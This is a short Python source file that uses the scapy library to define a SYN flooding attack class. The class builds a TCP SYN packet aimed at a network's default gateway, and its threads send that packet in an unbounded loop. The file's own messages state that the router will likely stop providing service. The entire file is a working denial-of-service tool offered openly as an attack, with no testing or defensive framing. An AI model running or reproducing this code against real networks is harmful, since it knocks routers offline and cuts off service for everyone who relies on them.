import scapy.all
import threading

class SYNFlooding:
    """A class which represents the SYN flooding attack."""

    def __init__(self, defaultGatewayIp, dstPort, threadsAmount) -> None:
        self.defaultGatewayIp = defaultGatewayIp
        self.dstPort = dstPort
        self.threadsAmount = threadsAmount
        self.synPacket = scapy.all.IP(dst=self.defaultGatewayIp) / scapy.all.TCP(dport=self.dstPort, flags='S')
        print("Successfully initialized a TCP packet.")

        self.running = threading.Event()

    def StartAttack(self):
        # The function gets nothing.
        # The function starts the threads of the attack.
        self.running.set()
        self.listOfThreads = []
        for _ in range(self.threadsAmount):
            thread = threading.Thread(target=self.SendSYNPackets)
            self.listOfThreads.append(thread)
        print("The attack has been started!\nThe SYN packets are being sent now.\nThe local network's router probably won't be able to provide services while the program is running.")
        for thread in self.listOfThreads:
            thread.start()

    def SendSYNPackets(self):
        # The function gets nothing.
        # The function starts the attack by sending an unlimited amount of SYN requests.
        while self.running.is_set():
            scapy.all.send(self.synPacket, verbose=0)

    def StopAttack(self):
        # The function gets nothing.
        # The function stops the attack by stopping all the attack's threads.
        self.running.clear()
        for thread in self.listOfThreads:
            thread.join()
        print("The attack has been stopped.")